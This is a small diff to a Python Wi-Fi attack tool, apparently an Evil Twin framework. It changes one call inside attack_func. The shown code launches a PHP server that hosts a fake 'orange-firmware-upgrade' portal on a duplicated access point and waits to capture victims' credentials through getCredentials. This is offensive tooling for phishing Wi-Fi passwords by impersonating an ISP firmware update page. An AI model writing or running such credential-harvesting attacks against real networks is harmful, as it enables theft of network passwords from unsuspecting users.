@@ -691,7 +691,7 @@ def attack_func(network_interface, attack_mode):
             php_server = os.system(f"cd ETwin-templates/orange-firmware-upgrade;xterm -hold -e sudo php -S 192.168.1.1:80 &")
             print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Waiting for Credentials..'}")
             print(Fore.WHITE)
-            getCredentials("dupAccesPoint")
+            getCredentials("dupAccesPoint", "B")
             # Killing all the process.
             process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
             out, err = process1.communicate()
